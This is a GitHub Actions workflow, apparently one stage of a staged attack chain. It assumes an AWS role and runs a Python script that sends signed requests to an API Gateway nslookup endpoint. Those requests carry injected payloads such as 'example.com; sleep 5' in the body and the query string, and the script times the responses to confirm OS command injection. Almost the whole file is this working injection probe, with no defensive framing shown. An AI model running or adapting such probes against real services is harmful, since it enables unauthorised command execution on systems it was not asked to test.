name: Stage2-11-Confirm-Domain-Injection

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  timing:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Run timing probes
        run: |
          python3 - <<'PY'
          import os
          import time
          import requests
          from requests_aws4auth import AWS4Auth

          base = (
              "https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
              "/dev/nslookup"
          )

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = [
              (
                  "baseline_body",
                  base,
                  {"domain": "example.com"}
              ),
              (
                  "sleep_body",
                  base,
                  {"domain": "example.com; sleep 5"}
              ),
              (
                  "sleep_query",
                  base + "?domain=example.com%3B%20sleep%205",
                  {}
              )
          ]

          for name, url, body in tests:
              start = time.monotonic()

              response = requests.post(
                  url,
                  json=body,
                  auth=auth,
                  timeout=20
              )

              elapsed = time.monotonic() - start

              print(f"TEST={name}")
              print(f"HTTP={response.status_code}")
              print(f"ELAPSED={elapsed:.2f}")
              print(response.text)
              print("---")
          PY
